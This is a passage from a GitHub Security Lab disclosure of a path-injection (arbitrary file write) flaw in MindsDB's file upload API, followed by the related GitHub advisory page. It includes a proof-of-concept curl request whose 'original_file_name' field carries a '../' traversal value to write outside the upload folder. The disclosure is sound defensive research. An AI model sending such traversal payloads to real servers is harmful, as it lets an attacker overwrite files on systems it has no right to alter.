The same [`put`](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L30-L153) method in mindsdb/mindsdb/api/http/namespaces/file.py does not validate the user-controlled [`original_file_name`](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L127) value, which is used in a path and afterwards moved in [file\_controller.py](https://github.com/mindsdb/mindsdb/blob/v23.7.4.1/mindsdb/interfaces/file/file_controller.py) on [lines 98-100](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/interfaces/file/file_controller.py#L98-L100), which leads to path injection.

```
source = file_dir.joinpath(file_name)
# NOTE may be delay between db record exists and file is really in folder
shutil.move(file_path, str(source))

```

Since the path injection happens after the file’s contents have been checked by the `_handle_source` method in [file\_handler.py](https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/integrations/handlers/file_handler/file_handler.py#L100-L141) to be one of csv, xls, xlsx, json or parquet files, it is possible to create and overwrite files that are real csv, xls, xlsx, json or parquet files.

This issue was found using the [Uncontrolled data used in path expression CodeQL query for python](https://codeql.github.com/codeql-query-help/python/py-path-injection/).

#### Impact

This issue may lead to `limited file write`. It allows for creating and overwriting files, but only if they are real csv, xls, xlsx, json or parquet files.

#### Proof of Concept

1. Create a new test folder with a potentially dangerous file called `file.csv`. Start a simple python server in the folder with `python -m http.server 9090`. This command will serve the example files container in the folder on `http://127.0.0.1:9090`
2. Start MindsDB. We assume in this example that MindsDB in running on `http://127.0.0.1:47334/`
3. Send the below request to MindsDB
   ```
   curl -X PUT http://127.0.0.1:47334/api/files/bar -H "Content-Type: application/json" -d '{"name":"bar","original_file_name":"../../../../../../../../../../../mindsdb/file.txt","source":"http://127.0.0.1:9090/file.csv","source_type":"url"}'

   ```

   You may need to modify the `original_file_name` value in case you are using another folder name for your MindsDB installation.
4. Go to the `mindsdb` folder on the server and check that file.txt file with contents of file.csv has been created.

## CVE

* GHSL-2023-182 has CVE-2023-49795
* GHSL-2023-183 has CVE-2023-50731
* GHSL-2023-184 has CVE-2023-49796

## Credit

These issues were discovered and reported by GHSL team member [@sylwia-budzynska (Sylwia Budzynska)](https://github.com/sylwia-budzynska).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-182`, `GHSL-2023-183`, or `GHSL-2023-184` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_a8dff22b_20250114_192724.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindsdb%2Fmindsdb%2Fsecurity%2Fadvisories%2FGHSA-j8w6-2r9h-cxhj)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmindsdb%2Fmindsdb%2Fsecurity%2Fadvisories%2FGHSA-j8w6-2r9h-cxhj)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=mindsdb%2Fmindsdb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mindsdb](/mindsdb)
/
**[mindsdb](/mindsdb/mindsdb)**
Public

* [Notifications](/login?return_to=%2Fmindsdb%2Fmindsdb) You must be signed in to change notification settings
* [Fork
  4.9k](/login?return_to=%2Fmindsdb%2Fmindsdb)
* [Star
   27.1k](/login?return_to=%2Fmindsdb%2Fmindsdb)

* [Code](/mindsdb/mindsdb)
* [Issues
  82](/mindsdb/mindsdb/issues)
* [Pull requests
  65](/mindsdb/mindsdb/pulls)
* [Discussions](/mindsdb/mindsdb/discussions)
* [Actions](/mindsdb/mindsdb/actions)
* [Projects
  1](/mindsdb/mindsdb/projects)
* [Security](/mindsdb/mindsdb/security)
* [Insights](/mindsdb/mindsdb/pulse)

Additional navigation options

* [Code](/mindsdb/mindsdb)
* [Issues](/mindsdb/mindsdb/issues)
* [Pull requests](/mindsdb/mindsdb/pulls)
* [Discussions](/mindsdb/mindsdb/discussions)
* [Actions](/mindsdb/mindsdb/actions)
* [Projects](/mindsdb/mindsdb/projects)
* [Security](/mindsdb/mindsdb/security)
* [Insights](/mindsdb/mindsdb/pulse)

# GitHub Security Lab (GHSL) Vulnerability Report: Arbitary write GHSL-2023-182

Moderate

[ZoranPandovski](/ZoranPandovski)
published
GHSA-j8w6-2r9h-cxhj
Dec 14, 2023

## Package

pip

mindsdb
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

23.7.4.1

## Patched versions

23.11.4.1

## Description

### Impact

Issue: Arbitrary file write in file.py (GHSL-2023-183)

### Patches

Use mindsdb staging branch or v23.11.4.1

### Severity

Moderate

### CVE ID

No known CVE

### Weaknesses

No CWEs

### Credits

* [![@sylwia-budzynska](https://avatars.githubusercontent.com/u/102833689?s=40&v=4)](/sylwia-budzynska)
  [sylwia-budzynska](/sylwia-budzynska)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


